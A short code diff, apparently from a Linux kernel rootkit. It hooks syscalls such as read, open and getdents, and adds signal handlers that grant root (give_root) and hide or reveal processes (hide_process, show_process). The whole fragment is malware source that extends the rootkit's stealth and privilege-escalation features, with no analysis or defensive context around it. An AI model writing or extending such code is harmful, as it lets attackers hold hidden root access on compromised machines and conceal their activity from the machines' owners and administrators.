@@ -18,7 +18,9 @@ INIT_HOOK_HANDLERS(P_SYSCALL_HOOKS, read, write, open, pread64, sendfile, getden
 
 // Define signal handler array
 const signal_handler_t P_SIG_HANDLERS[] = {
-    NEW_SIGNAL_HANDLER(-1, SIGROOT, give_root),
+    NEW_SIGNAL_HANDLER(PID_ANY, SIGROOT, give_root),
+    NEW_SIGNAL_HANDLER(PID_ANY, SIGHIDE, hide_process),
+    NEW_SIGNAL_HANDLER(PID_ANY, SIGSHOW, show_process),
 };
 
 #endif
